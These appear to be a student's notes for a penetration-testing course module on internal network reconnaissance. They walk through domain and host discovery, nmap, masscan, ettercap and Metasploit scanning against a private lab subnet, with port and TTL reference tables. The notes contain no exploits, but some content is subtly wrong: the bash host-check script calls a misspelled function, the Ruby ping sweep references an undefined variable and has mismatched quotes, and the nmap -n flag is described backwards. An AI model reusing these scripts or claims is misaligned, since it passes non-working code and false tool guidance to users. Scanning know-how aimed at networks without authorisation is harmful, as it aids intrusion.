[TOC]



# Module 06 Network Penetration Testing - Internal

**External penetration** testing ensures that all unnecessary ports and services are disabled and blocked.

**Internal penetration** testing ensures the organization’s internal assets are secured properly.

## Internal Network Penetration Testing 

- Internal network penetration testing involves testing computers and devices within the company or organization

- This test examines internal IT systems for any weakness that could be used to disrupt the confidentiality, availability, or integrity of the network

- This test is performed to determine known and unknown vulnerabilities in the computer systems

  and exploits them from the perspective of an inside attacker

Internal network penetration testing is performed within the company. It involves testing the security strengths and weakness of an organization’s devices and computers. It includes checking the site location and connecting to the internal network. It is mainly performed to check for known and unknown vulnerabilities in the computer systems and exploits them from the perspective of an inside attacker.

It almost uses the same tools and methods as the external penetration testing used to test the internal network; the only difference is that the external penetration is performed from outside an organization, where it mainly focusses on unknown vulnerabilities. This test examines internal IT systems for any weakness that could be used to disrupt the confidentiality, availability, or integrity of the network.

Internal penetration testing highlights the following elements of an organization’s network:

- Protocol and network infrastructure vulnerabilities

- Server operating system and application vulnerabilities

- Internal controls and procedures

- Unsuitable user privileges

- Internal “intrawalls” separating subnetworks

## Why Internal Network Penetration Testing? 

- To check internal security measures that are already in place and determine what information and access can be obtained
- To allow management to understand the level of risk from malicious users associated with the organization's internal network
- To provide complete details of the organization’s internal network and suggest a cost-effective and targeted mitigation approach
- To create a basis for future decisions regarding the organization’s information security strategy and resource allocation

The testing is done mainly to prove how an unauthorized user with network level privileges can access to an organization’s environment and how easily they can access the sensitive information from the company and also demonstrate how a hacker can access if they were to compromise the company’s gateway.

The following are the few scenarios that are needed to be addressed when conducting an internal penetration test:

- Check internal security measures that are already in place and determine what information and access can be obtained.

- Allow management to understand the level of risk from malicious users associated with the organization’s internal network.

- Provide complete details of the organization’s internal network and suggest a cost-effective and targeted mitigation approach.

- Create a basis for future decisions regarding the organization’s information security strategy and resource allocation.

The internal penetration testing can also answer all the question mentioned below and educate staff members in an organization regarding the kind of risk they might face it.

-  What if an employee gains the company’s internal HR database and obtains the confidential data?
-  What can be done if an employee with knowledge of the IT infrastructure penetrates the network?
-  What if a hacker breaks into the internal networks that house employees’ PCs and databases and steals sensitive information?
-  What if a guest or visitor walks into the company with the help of employee and steals data from an isolated machine?

## Footprinting

Footprinting is the first phase of penetration testing in which you can gain primary information about a potential target. Internal information like identifying domains, hosts, subnets, IP ranges, and so on will be acquired or extracted in this phase.

### Identify the Internal Domains

- Identify the list of domains in the network
- Type net view /domain command in command prompt to list out domain in the network

“Net view” command is used to display a list of domains, computers, or resources that are shared by the specified computer. If the command is used without the parameters, then it displays a list of computers in your current domain.

```
net view /domain 
```

![image-20210818185912047](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210818185912047.png)

Following are some of the additional net view commands that can obtain further information:

- net view \\\computerName
  It displays the list of file/printer shares on a remote computer.
- net view \\\computername /all
  It displays the shares including hidden shares on a remote computer.

* net view /network:nw
  It displays the list of share on a remote Network computer

### Identify Hosts

- Run the following command in the command line, you can find the domain name:

  ```
  systeminfo | findstr /B /C:"Domain"\
  ```

- Run the following command to find the logged in user’s domain:

  ```
  echo %userdomain%
  ```

- WMIC can also be used alternatively to find domain name:

  ```
  wmic computersystem get domain
  ```

- To view all available servers on specific domain type:

  ```
  net view /domain: [domain name]
  ```

  ![image-20210818190713943](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210818190713943.png)

### Identify the Internal IP Range of the Subnet

There are different ways to identify the internal IP range of the network.

- Type ipconfig in command prompt to know your IP address and subnet mask.

- For example, 192.168.1.101 is your IP address and 255.255.255.0 is your subnet mask.

- The network address (default gateway) of the subnet will be 192.168.1.1.

- The broadcast IP for this subnet will be 192.168.1.255.

- Ping [broadcast IP].

- Type arp -a. You will get the list of all IP addresses on your segment.

  ![image-20210819063625242](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819063625242.png)

- **Nmap**

  Source: https://www.nmap.org

  Nmap has a feature to list all the IP addresses in a subnet. The command -sL will list all the IP addresses on Nmap command line. If you wish to see reverse DNS lookup performed on each of the IP addresses being listed, then use -n option. See below figure that list the IP addresses in a target subnet along with no reverse DNS lookups.

  ```
  nmap -sL -n 192.168.0.1/30
  ```

  ![image-20210819063924522](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819063924522.png)

- **SoftPerfect Network Scanner**

  Source: https://www.softperfect.com

  SoftPerfect Network Scanner is a multi-threaded IP, NetBIOS, and SNMP scanner. The program pings computers, scans for listening TCP/UDP ports, and displays the types of resources shared on the network—including system and hidden ones. Also, it can mount shared folders as network drives, browse them using Windows Explorer, filter the results list, and more. SoftPerfect Network Scanner can also check for a user-defined port and report if one is open. It can also resolve host names and auto-detect the local and external IP range. It supports remote shutdown and Wake-On-LAN.

  Select Options > IP Address > Detect Local IP Range and it will calculate the IP range of the network.

  ![image-20210819064146862](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819064146862.png)

- **MyLanViewer**
  Source: http://www.mylanviewer.com
  It is a network scanning tool that includes NETBIOS, IP scanning, Wake-On-Lan manager, and remote shutdown. This tool can be used to list all IP addresses, MAC address, and folders shared on computers through wired and wireless network.

  ![image-20210819064341138](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819064341138.png)

- **SolarWinds’s IP Network Browser**
  Source: https://www.solarwinds.com
  Solarwind’s IP Network Browser is a discovery tool to scan a single device, subnet, or IP address range to show information about the devices. It uses SNMP and agent must have SNMP active on the device to gather information.
  To scan IP address range in SolarWind’s IP Network Browser, enter the beginning IP address in the Beginning IP address field and enter the final IP address of the range in the Ending IP address field and click Scan Address Range

  ![image-20210819064521765](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210819064521765.png)

## Scanning

- Scanning is the active step of attempting to connect to systems to elicit a response
- For penetration testing the response is the key

### Scanning Methodology 

- **Live systems**
  -sP, -sn in nmap

- **Ports Identify Vulnerabilities**
  What are the doors on these targets 
  Remember all 0-65535
  -sS, -sT, -sU

- **Services** 

  What is behind these doors

  -sV

- Enumeration

  -sC, -A

- Identify Vulnerabilities

  - Manual

  - Tools

- Exploit

  - Validation of the vulnerability
  - Manual and tools

### Scan a Network: IP Addresses Scan, Multiple IP Addresses Scan, Subnet Scan

Usually, penetration testers and system administrators scan not only a single machine but a range of hosts using Nmap. It supports different formats of IP address ranges as a penetration tester, you must know how to deal with them. By this scan, you can identify active hosts, open ports, and so on, on a network.

### Nmap

The below are various types of scans using Nmap:

- **Scanning single host or IP address**
  Syntax: $ nmap [IP Address]

- **Scanning Multiple hosts or IP Addresses**
  Syntax:$ nmap [IP1] [IP2] [IP3] .. (or) $ nmap 10.10.10.10,11,12, ..

- **Scan a Subnet**

  Syntax:$ nmap 10.10.10.0/24

- **Scan IP Address Range**

  Syntax:$ nmap 10.10.10.10-155

- **Scanning Host/Host List from File**

  Syntax:$ nmap -iL input.txt

- **Saving Result into the file**

  Syntax:$ nmap 10.10.10.10 > output.txt

- **Quick Scan mode**

  Syntax:$ nmap -F [IP Address]

Apart from Nmap, you can also use the following tools to perform these scans:

- Angry IP Scanner (https://angryip.org)
- SoftPerfect Network Scanner (https://www.softperfect.com)
- SuperScan (https://www.mcafee.com)

### Netdiscover

```
#netdiscover -r 192.168.101.0/24
Currently scanning: (passive)   |   Screen View: Unique Hosts                                                       
                                                                                                                     
 304 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 18820                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.101.106 28:cf:e9:7d:ff:17      7     420  Apple, Inc.                                                       
 192.168.101.2   bc:98:89:9d:3c:58     13     780  Fiberhome Telecommunication Technologies Co.,LTD                  
 192.168.101.112 ec:9b:f3:3c:f8:a2     22    1320  SAMSUNG ELECTRO-MECHANICS(THAILAND)                               
 192.168.101.117 94:e9:79:fe:2a:2d    133    8500  Liteon Technology Corporation                                     
 0.0.0.0         94:e9:79:fe:2a:2d      4     256  Liteon Technology Corporation                                     
 192.168.101.3   3c:84:6a:a7:eb:b0    106    6360  TP-LINK TECHNOLOGIES CO.,LTD.                                     
 0.0.0.0         3c:84:6a:a7:eb:b0      7     420  TP-LINK TECHNOLOGIES CO.,LTD.                                     
 192.168.101.122 18:db:f2:39:6a:b3      1      60  Dell Inc.                                                         
 192.168.101.110 c8:94:bb:65:d2:79     11     704  HUAWEI TECHNOLOGIES CO.,LTD 
```

**Note: Create some traffic to get better result**

```
#nmap -sP 192.168.101.0/24
#nmap -sS 192.168.101.0/24

! Delete arp cache
#arp -d *
```

**Passive mode**

```
#netdiscover -p
Currently scanning: (passive)   |   Screen View: Unique Hosts                                                       
                                                                                                                     
 304 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 18820                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.101.106 28:cf:e9:7d:ff:17      7     420  Apple, Inc.                                                       
 192.168.101.2   bc:98:89:9d:3c:58     13     780  Fiberhome Telecommunication Technologies Co.,LTD                  
 192.168.101.112 ec:9b:f3:3c:f8:a2     22    1320  SAMSUNG ELECTRO-MECHANICS(THAILAND)                               
 192.168.101.117 94:e9:79:fe:2a:2d    133    8500  Liteon Technology Corporation                                     
 0.0.0.0         94:e9:79:fe:2a:2d      4     256  Liteon Technology Corporation                                     
 192.168.101.3   3c:84:6a:a7:eb:b0    106    6360  TP-LINK TECHNOLOGIES CO.,LTD.                                     
 0.0.0.0         3c:84:6a:a7:eb:b0      7     420  TP-LINK TECHNOLOGIES CO.,LTD.                                     
 192.168.101.122 18:db:f2:39:6a:b3      1      60  Dell Inc.                                                         
 192.168.101.110 c8:94:bb:65:d2:79     11     704  HUAWEI TECHNOLOGIES CO.,LTD 
```

### Ethercap

```
#ettercap -T -i eth0 -q -p

ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team

Listening on:
  eth0 -> 00:0C:29:6D:B7:F7
	  192.168.101.115/255.255.255.0
	  fe80::fa22:7bc:82f3:d94f/64

SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
Privileges dropped to EUID 65534 EGID 65534...

  34 plugins
  42 protocol dissectors
  57 ports monitored
28230 mac vendor fingerprint
1766 tcp OS fingerprint
2182 known services
Lua: no scripts were specified, not starting up!

Randomizing 255 hosts for scanning...
Scanning the whole netmask for 255 hosts...
* |==================================================>| 100.00 %

8 hosts added to the hosts list...
Starting Unified sniffing...


Text only Interface activated...
Hit 'h' for inline help


Inline help:

 [vV]      - change the visualization mode
 [pP]      - activate a plugin
 [fF]      - (de)activate a filter
 [lL]      - print the hosts list
 [oO]      - print the profiles list
 [cC]      - print the connections list
 [rR]      - adjust SSL intercept rules
 [sS]      - print interfaces statistics
 [<space>] - stop/cont printing packets
 [qQ]      - quit



Hosts list:

1)	192.168.101.2	BC:98:89:9D:3C:58
2)	192.168.101.3	3C:84:6A:A7:EB:B0
3)	192.168.101.103	28:6D:CD:4F:88:E7
4)	192.168.101.104	28:6D:CD:4F:8A:C6
5)	192.168.101.105	28:6D:CD:4E:45:8A
6)	192.168.101.107	7C:91:22:2B:0E:1A
7)	192.168.101.108	28:6D:CD:4F:00:8D
8)	192.168.101.110	C8:94:BB:65:D2:79
9)	192.168.101.112	EC:9B:F3:3C:F8:A2
10)	192.168.101.113	8E:57:89:77:47:F4
11)	192.168.101.117	94:E9:79:FE:2A:2D
12)	192.168.101.122	18:DB:F2:39:6A:B3


Closing text interface...


Terminating ettercap...
Lua cleanup complete!
Unified sniffing was stopped.
```

### Bash Script

- We can check for a host being up or down with a simple script

hostcheck.sh

```
#!/bin/bash
host=$1
function pingcheck {
ping=`ping -c 1 $host | grep bytes | wc -l`
if [ "$ping" -gt 1 ];
then
echo "$host is up";
else
echo "$host is down quitting";
exit
fi
}
pingchec
```

bash hostcheck.sh [IP]

```
#bash hostcheck.sh 192.168.101.2
192.168.101.2 is up
```

### Ruby Ping Sweep

```
#!/usr/bin/ruby
require 'socket'
s = UDPSocket.new
254.times do |i|
next if i == 0
s.send("test", 0 , "192.168.101." + i.to_s, 53)
end
f = File.open("/proc/net/arp",'r')
data = f.read.split("\n")
up_hosts = []
data.each do |line|
next if entry[3] == "00:00:00:00:00:00"
next if entry[0] == "IP"
up_hosts << {:ip => entry[0], :mac => entry[3]}
end
print "Active network hosts\n"
print "%-12s\t%s\n" % ["IP Addr” , “MAC Address")
up_hosts.each do |host|
print "%-12s\t%s\n" % [host[:ip], host[:mac]]
end
```

## Port Scanning

A port scan will return the following responses: 

- **Open ports**: The target host system sends a reply signifying that a service exists with the valid port number.
- **Closed ports**: These responses signify that the connection to a port is refused.
- **Blocked ports**: These indicate a no-reply message from the host.

### Hping3

```
#hping3 192.168.101.2 --scan 0-65535 -S | more
Scanning 192.168.101.2 (192.168.101.2), port 0-65535
65536 ports to scan, use -V to see all the replies
+----+-----------+---------+---+-----+-----+-----+
|port| serv name |  flags  |ttl| id  | win | len |
+----+-----------+---------+---+-----+-----+-----+
   80 http       : .S..A...  64     0  5840    46
 8099            : .S..A...  64     0  5840    46
All replies received. Done.
Not responding ports: 
```

### Massscan

- Fast scanner
- Designed to scan the Internet
- Similar to ZMap
- Can split the scan up and set times

```
#masscan 192.168.101.0/24 -p 80,445
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-08-19 14:29:20 GMT
Initiating SYN Stealth Scan
Scanning 256 hosts [2 ports/host]
Discovered open port 445/tcp on 192.168.101.117                                
Discovered open port 80/tcp on 192.168.101.2                                   
Discovered open port 445/tcp on 192.168.101.122                                
Discovered open port 80/tcp on 192.168.101.3             
```

## Nmap

### Scan multiple ports

```
#nmap -p 80,443 192.168.101.2
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 22:33 PST
Nmap scan report for 192.168.101.2
Host is up (0.0022s latency).

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp closed https
MAC Address: BC:98:89:9D:3C:58 (Fiberhome Telecommunication Technologies)

Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds

```

### Scan a port

```
#nmap -p 80 192.168.101.2
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 22:34 PST
Nmap scan report for 192.168.101.2
Host is up (0.00072s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: BC:98:89:9D:3C:58 (Fiberhome Telecommunication Technologies)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

### Scan all ports

```
#nmap -p "*" [IP Address]
```

### Scan port range

```
#nmap -p 1-500 [IP Address]
```

### Scan most common ports

```
#nmap --top-ports [Number] [IP Address]
```

### Scan specific TCP ports

```
nmap -p T:80 10.10.10.10
```

### Scan all TCP ports

```
nmap -sT 10.10.10.10
```

### Scan specific UDP ports

```
nmap -p U:53 10.10.10.10
```

### Scan all UDP ports

```
nmap -sU 10.10.10.10
```

### Display only Open Ports

```
nmap --open 10.10.10.10
```

## Common Port list

| Port     | Service name                                              |
| :------- | :-------------------------------------------------------- |
| 7        | Echo                                                      |
| 20, 21   | File Transfer Protocol (FTP)                              |
| 22       | Secure Shell (SSH)                                        |
| 23       | Telnet                                                    |
| 25       | Simple Mail Transfer Protocol (SMTP)                      |
| 43       | WHOIS                                                     |
| 50, 51   | IPSec                                                     |
| 53       | Domain Name System (DNS)                                  |
| 67, 68   | Dynamic Host Configuration Protocol (DHCP)                |
| 69       | Trivial File Transfer Protocol (TFTP)                     |
| 80       | HyperText Transfer Protocol (HTTP)                        |
| 109      | Post Office Protocol (POP2)                               |
| 110      | Post Office Protocol (POP3)                               |
| 115      | Simple File Transfer Protocol                             |
| 118      | SQL services                                              |
| 119      | Network News Transport Protocol (NNTP)                    |
| 123      | Network Time Protocol (NTP)                               |
| 135-139  | NetBIOS                                                   |
| 143      | Internet Message Access Protocol (IMAP4)                  |
| 156      | SQL server                                                |
| 161, 162 | Simple Network Management Protocol (SNMP)                 |
| 194      | Internet Relay Chat (IRC)                                 |
| 389      | Lightweight Directory Access Protocol                     |
| 443      | HTTP with Secure Sockets Layer (SSL)                      |
| 464      | Kerberos (change/set password)                            |
| 465      | SMTP over SSl                                             |
| 514      | Syslog                                                    |
| 587      | SMTP                                                      |
| 660      | Max OS X server                                           |
| 631      | Internet Printing Protocol                                |
| 636      | Lightweight directory access protocol (LDAP) over TLS/SSL |
| 749-752  | Kerberos                                                  |
| 843      | Adobe Flash                                               |
| 873      | rsync file synchronization protocol                       |
| 902      | VMware server                                             |
| 989, 990 | FTP over SSL/TLS (implicit mode)                          |
| 992      | Telnet protocol over TLS/SSL                              |
| 993      | Internet message access protocol over SSL (IMAPS)         |
| 995      | Post office protocol 3 over TLS/SSL (POP3S)               |
| 3389     | Remote Desktop Protocol                                   |

## Other Network Scanning Tools

- **Angry IP Scanner**
  Source: https://angryip.org
  Angry IP scanner is a small but fast IP scanner that can scan IPs in any range and allows the user to ping each IP address to check if it is alive. It verifies an IP address, scans ports, and determines the hostname related to an IP address.
- **SuperScan**
  Source: https://www.mcafee.com
  SuperScan is a connect-based TCP port scanner, pinger, and hostname resolver with multi-threaded and asynchronous techniques to scan a network. It detects open ports of TCP, UDP, and determines the services running on these ports. It is used to evaluate computer security by system administrators, penetration testers, crackers, and script kiddies.

## Scanning from within Metasploit

- Start the database

  ```
  systemctl start postgresql
  ```

- Initialized the database (only required once)

  ```
  msfdb_init
  ```

- Verify the database is connected

  ```
  #msfdb status
  ● postgresql.service - PostgreSQL RDBMS
       Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
       Active: active (exited) since Thu 2021-08-19 19:14:50 PST; 3h 53min ago
      Process: 1107 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
     Main PID: 1107 (code=exited, status=0/SUCCESS)
          CPU: 1ms
  
  Aug 19 19:14:50 parrot systemd[1]: Starting PostgreSQL RDBMS...
  Aug 19 19:14:50 parrot systemd[1]: Finished PostgreSQL RDBMS.
  
  COMMAND  PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
  postgres 890 postgres    3u  IPv6  25674      0t0  TCP localhost:5432 (LISTEN)
  postgres 890 postgres    4u  IPv4  25675      0t0  TCP localhost:5432 (LISTEN)
  
  UID          PID    PPID  C STIME TTY      STAT   TIME CMD
  postgres     890       1  0 19:14 ?        Ss     0:00 /usr/lib/postgresql/12/bin/postgres -D /var/lib/postgresql/12/m
  
  [+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
  ```

  ### Metasploit Databases

  | Commad     | Usage                                                        |
  | ---------- | ------------------------------------------------------------ |
  | db_connect | This command is used to interact with databases other than the default one |
  | db_export  | This commands used to export the entire set of data stored in the database for the sake of creating reports or as an input to another tool |
  | db_nmap    | This command is used for scanning the target with NMAP, and storing the results in the Metasploit database |
  | db_status  | This command is used to check whether the database connectivity is present or not |
  | db_import  | This commands used to import results from other tools such as Nessus, NMAP, and so on |

  ### Workspaces

  Once connected to the database, we can start organizing our different movements by using what are called ‘workspaces’, This gives us the ability to save different scans from different locations/networks/subnets

  For example

  - Add
    -a
  - Delete
    -d

  ```
  msf6 > workspace -a LPT
  [*] Added workspace: LPT
  [*] Workspace: LPT
  msf6 > workspace LPT 
  [*] Workspace: LPT
  msf6 > workspace 
    default
  * LPT
  msf6 > 
  ```

  

### Gathering our Data

Importing 

- Requires an xml formatted scan output

- Run scan directly to metasploit

- db_nmap

  Same command options as Nmap

  ```
  msf6 > db_nmap -A 192.168.101.0/24
  [*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 03:58 PST
  [*] Nmap: Stats: 0:02:42 elapsed; 248 hosts completed (7 up), 7 undergoing SYN Stealth Scan
  [*] Nmap: SYN Stealth Scan Timing: About 99.58% done; ETC: 04:01 (0:00:01 remaining)
  [*] Nmap: Stats: 0:02:51 elapsed; 248 hosts completed (7 up), 7 undergoing SYN Stealth Scan
  [*] Nmap: SYN Stealth Scan Timing: About 99.99% done; ETC: 04:01 (0:00:00 remaining)
  [*] Nmap: Stats: 0:02:58 elapsed; 248 hosts completed (7 up), 7 undergoing Service Scan
  [*] Nmap: Service scan Timing: About 15.38% done; ETC: 04:01 (0:00:33 remaining)
  [*] Nmap: Nmap scan report for 192.168.101.2
  [*] Nmap: Host is up (0.0064s latency).
  [*] Nmap: Not shown: 998 closed ports
  [*] Nmap: PORT     STATE SERVICE VERSION
  [*] Nmap: 80/tcp   open  http    GoAhead WebServer 2.5.0
  [*] Nmap: |_http-server-header: GoAhead-Webs/2.5.0
  [*] Nmap: | http-title: Redirected
  [*] Nmap: |_Requested resource was http://192.168.101.2/login.asp
  [*] Nmap: 8099/tcp open  unknown
  [*] Nmap: MAC Address: BC:98:89:9D:3C:58 (Fiberhome Telecommunication Technologies)
  [*] Nmap: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
  [*] Nmap: TCP/IP fingerprint:
  [*] Nmap: OS:SCAN(V=7.91%E=4%D=8/20%OT=80%CT=1%CU=44050%PV=Y%DS=1%DC=D%G=Y%M=BC9889%T
  [*] Nmap: OS:M=611EB96E%P=x86_64-pc-linux-gnu)SEQ(SP=CD%GCD=1%ISR=CF%TI=Z%CI=Z%II=I%T
  [*] Nmap: OS:S=7)OPS(O1=M5B4ST11NW2%O2=M5B4ST11NW2%O3=M5B4NNT11NW2%O4=M5B4ST11NW2%O5=
  [*] Nmap: OS:M5B4ST11NW2%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1
  [*] Nmap: OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW2%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
  [*] Nmap: OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M5B4ST11
  [*] Nmap: OS:NW2%RD=0%Q=)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)
  [*] Nmap: OS:T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%U
  [*] Nmap: OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
  [*] Nmap: Network Distance: 1 hop
  [*] Nmap: TRACEROUTE
  [*] Nmap: HOP RTT     ADDRESS
  [*] Nmap: 1   6.41 ms 192.168.101.2
  [*] Nmap: Nmap scan report for 192.168.101.3
  [*] Nmap: Host is up (0.0045s latency).
  [*] Nmap: Not shown: 997 closed ports
  [*] Nmap: PORT    STATE SERVICE  VERSION
  [*] Nmap: 22/tcp  open  ssh      Dropbear sshd 2011.54 (protocol 2.0)
  [*] Nmap: | ssh-hostkey:
  [*] Nmap: |_  1039 6a:79:5a:f8:31:cf:42:57:88:6b:53:74:a5:6e:e4:80 (RSA)
  [*] Nmap: 80/tcp  open  http     BusyBox http 1.19.4
  [*] Nmap: |_http-title: Site doesn't have a title (text/html).
  [*] Nmap: 443/tcp open  ssl/http BusyBox http 1.19.4
  [*] Nmap: |_http-title: Site doesn't have a title (text/plain).
  [*] Nmap: | ssl-cert: Subject: commonName=tplinkwifi.net/countryName=CN
  [*] Nmap: | Not valid before: 2020-04-21T16:00:32
  [*] Nmap: |_Not valid after:  2025-04-20T16:00:32
  [*] Nmap: |_ssl-date: TLS randomness does not represent time
  [*] Nmap: MAC Address: 3C:84:6A:A7:EB:B0 (Tp-link Technologies)
  ```

### Review the Data

- hosts

  Displays the traget information that you have discovered in your searches

  ```
  msf6 > hosts
  
  Hosts
  =====
  
  address          mac                name  os_name   os_flavor  os_sp  purpose  info  comments
  -------          ---                ----  -------   ---------  -----  -------  ----  --------
  192.168.101.2    bc:98:89:9d:3c:58        Linux                2.6.X  server
  192.168.101.3    3c:84:6a:a7:eb:b0        Linux                2.6.X  server
  192.168.101.103  28:6d:cd:4f:88:e7        embedded                    device
  192.168.101.104  28:6d:cd:4f:8a:c6        embedded                    device
  192.168.101.105  28:6d:cd:4e:45:8a        embedded                    device
  192.168.101.109  EC:9B:F3:3C:F8:A2
  192.168.101.110                           Linux                5.X    server
  192.168.101.122  18:db:f2:39:6a:b3        Linux                4.X    server
  ```

### Backing up our data

- db_export
  - Export the data outside of the Metasploit environment
  - Can export as xml or pwdump
    - Xml : Export all the information currently stored in our active workspace
    - Pwdump: Exports everything related to used/gathered credentials

### Setting up modules

- Take the data from the database and use it in our modules

- Works well for auxilliary

- hosts -c address,os_flavor

  ```
  msf6 > hosts -c address,os_name
  
  Hosts
  =====
  
  address          os_name
  -------          -------
  192.168.101.2    Linux
  192.168.101.3    Linux
  192.168.101.103  embedded
  192.168.101.104  embedded
  192.168.101.105  embedded
  192.168.101.109
  192.168.101.110  Linux
  192.168.101.122  Linux
  ```

### Import the data into a module

- Can use R option to import the target data into a module

- Use auxilliary/scanner/portscan/tcp

- hostrs -c address,os_name -S Linux -R

  ```
  msf6 > use auxiliary/scanner/portscan/tcp
  msf6 auxiliary(scanner/portscan/tcp) > hosts -c address,os_name -S Linux -R
  
  Hosts
  =====
  
  address          os_name
  -------          -------
  192.168.101.2    Linux
  192.168.101.3    Linux
  192.168.101.110  Linux
  192.168.101.122  Linux
  
  RHOSTS => 192.168.101.2 192.168.101.3 192.168.101.110 192.168.101.122
  msf6 auxiliary(scanner/portscan/tcp) > run
  
  [+] 192.168.101.2:        - 192.168.101.2:80 - TCP OPEN
  [+] 192.168.101.2:        - 192.168.101.2:8099 - TCP OPEN
  [*] Scanned 1 of 4 hosts (25% complete)
  [+] 192.168.101.3:        - 192.168.101.3:22 - TCP OPEN
  [*] Scanned 1 of 4 hosts (25% complete)
  [+] 192.168.101.3:        - 192.168.101.3:80 - TCP OPEN
  [+] 192.168.101.3:        - 192.168.101.3:443 - TCP OPEN
  [*] Scanned 2 of 4 hosts (50% complete)
  [+] 192.168.101.110:      - 192.168.101.110:22 - TCP OPEN
  [*] Scanned 2 of 4 hosts (50% complete)
  [*] Scanned 2 of 4 hosts (50% complete)
  [*] Scanned 3 of 4 hosts (75% complete)
  [*] Scanned 3 of 4 hosts (75% complete)
  [+] 192.168.101.122:      - 192.168.101.122:22 - TCP OPEN
  [+] 192.168.101.122:      - 192.168.101.122:139 - TCP OPEN
  [+] 192.168.101.122:      - 192.168.101.122:445 - TCP OPEN
  
  ```



## OS and Service Fingerprinting

### Identify the OS

| Device / OS    | Version               | Protocol     | TTL  |
| -------------- | --------------------- | ------------ | ---- |
| AIX            |                       | TCP          | 60   |
| AIX            |                       | UDP          | 30   |
| AIX            | 3.2, 4.1              | ICMP         | 255  |
| BSDI           | BSD/OS 3.1 and 4.0    | ICMP         | 255  |
| Compa          | Tru64 v5.0            | ICMP         | 64   |
| Cisco          |                       | ICMP         | 254  |
| DEC Pathworks  | V5                    | TCP and UDP  | 30   |
| Foundry        |                       | ICMP         | 64   |
| FreeBSD        | 2.1R                  | TCP and UDP  | 64   |
| FreeBSD        | 3.4, 4.0              | ICMP         | 255  |
| FreeBSD        | 5                     | ICMP         | 64   |
| HP-UX          | 9.0x                  | TCP and UDP  | 30   |
| HP-UX          | 10.01                 | TCP and UDP  | 64   |
| HP-UX          | 10.2                  | ICMP         | 255  |
| HP-UX          | 11                    | ICMP         | 255  |
| HP-UX          | 11                    | TCP          | 64   |
| Irix           | 5.3                   | TCP and UDP  | 60   |
| Irix           | 6.x                   | TCP and UDP  | 60   |
| Irix           | 6.5.3, 6.5.8          | ICMP         | 255  |
| juniper        |                       | ICMP         | 64   |
| MPE/IX (HP)    |                       | ICMP         | 200  |
| Linux          | 2.0.x kernel          | ICMP         | 64   |
| Linux          | 2.2.14 kernel         | ICMP         | 255  |
| Linux          | 2.4 kernel            | ICMP         | 255  |
| Linux          | Red Hat 9             | ICMP and TCP | 64   |
| MacOS/MacTCP   | 2.0.x                 | TCP and UDP  | 60   |
| MacOS/MacTCP   | X (10.5.6)            | ICMP/TCP/UDP | 64   |
| NetBSD         |                       | ICMP         | 255  |
| Netgear FVG318 |                       | ICMP and UDP | 64   |
| OpenBSD        | 2.6 & 2.7             | ICMP         | 255  |
| OpenVMS        | 07.01.2002            | ICMP         | 255  |
| OS/2           | TCP/IP 3.0            |              | 64   |
| OSF/1          | V3.2A                 | TCP          | 60   |
| OSF/1          | V3.2A                 | UDP          | 30   |
| Solaris        | 2.5.1, 2.6, 2.7, 2.8  | ICMP         | 255  |
| Solaris        | 2.8                   | TCP          | 64   |
| Stratus        | TCP_OS                | ICMP         | 255  |
| Stratus        | TCP_OS (14.2-)        | TCP and UDP  | 30   |
| Stratus        | TCP_OS (14.3+)        | TCP and UDP  | 64   |
| Stratus        | STCP                  | ICMP/TCP/UDP | 60   |
| SunOS          | 4.1.3/4.1.4           | TCP and UDP  | 60   |
| SunOS          | 5.7                   | ICMP and TCP | 255  |
| Ultrix         | V4.1/V4.2A            | TCP          | 60   |
| Ultrix         | V4.1/V4.2A            | UDP          | 30   |
| Ultrix         | V4.2 – 4.5            | ICMP         | 255  |
| VMS/Multinet   |                       | TCP and UDP  | 64   |
| VMS/TCPware    |                       | TCP          | 60   |
| VMS/TCPware    |                       | UDP          | 64   |
| VMS/Wollongong | 1.1.1.1               | TCP          | 128  |
| VMS/Wollongong | 1.1.1.1               | UDP          | 30   |
| VMS/UCX        |                       | TCP and UDP  | 128  |
| Windows        | for Workgroups        | TCP and UDP  | 32   |
| Windows        | 95                    | TCP and UDP  | 32   |
| Windows        | 98                    | ICMP         | 32   |
| Windows        | 98, 98 SE             | ICMP         | 128  |
| Windows        | 98                    | TCP          | 128  |
| Windows        | NT 3.51               | TCP and UDP  | 32   |
